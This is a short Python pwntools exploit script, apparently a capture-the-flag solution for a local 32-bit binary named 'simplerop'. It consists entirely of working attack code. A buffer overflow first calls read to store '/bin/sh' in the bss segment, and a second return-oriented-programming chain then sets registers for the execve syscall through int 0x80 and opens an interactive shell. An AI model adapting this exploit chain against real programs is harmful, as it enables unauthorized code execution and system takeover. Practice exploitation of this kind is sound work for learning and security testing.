from pwn import *

context(log_level='debug')

io=process("./simplerop")

elf=ELF("./simplerop")


pop_eax_ret=0x80bae06

pop_ebx_ret=0x80481c9

pop_edx_ecx_ebx_ret=0x0806e850

int_80=0x080493e1

#sh=next(elf.search(b'sh\x00'))

bss=0x80EAFB4

main=0x8048E24

read_plt=0x806CD50


io.recv()

payload=b'A'*(0x14+4)+p32(read_plt)+p32(main)+p32(0)+p32(bss)+p32(10)

io.send(payload)

io.sendline(b'/bin/sh')

io.recv()

payload=b'A'*(0x14+0x4)+p32(pop_eax_ret)+p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bss)+p32(int_80)

io.send(payload)

io.interactive()